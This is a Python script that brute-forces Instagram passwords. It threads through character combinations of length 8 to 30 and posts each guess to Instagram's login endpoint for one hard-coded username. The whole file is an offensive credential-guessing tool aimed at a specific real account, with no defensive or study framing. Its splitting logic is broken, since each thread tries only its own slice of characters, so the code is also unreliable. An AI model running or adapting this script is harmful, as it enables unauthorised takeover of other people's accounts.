import itertools
import requests
import threading

def crack_password(username, min_length, max_length, num_threads):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+:;'
    for password_length in range(min_length, max_length+1):
        chunk_size = len(chars) // num_threads
        threads = []
        for i in range(num_threads):
            start = i * chunk_size
            end = start + chunk_size
            if i == num_threads - 1:
                end = len(chars)
            thread = threading.Thread(target=crack_password_chunk, args=(username, password_length, chars[start:end]))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

def crack_password_chunk(username, password_length, chars):
    for password in itertools.product(chars, repeat=password_length):
        password = ''.join(password)
        session = requests.Session()
        response = session.post('https://www.instagram.com/accounts/login/ajax/', data={'username':username, 'password':password})
        if 'authenticated":true' in response.text:
            print('Password found:', password)
            return
    print(f'No passwords found for length {password_length}')

crack_password('fuckoffcyka', 8, 30, 10)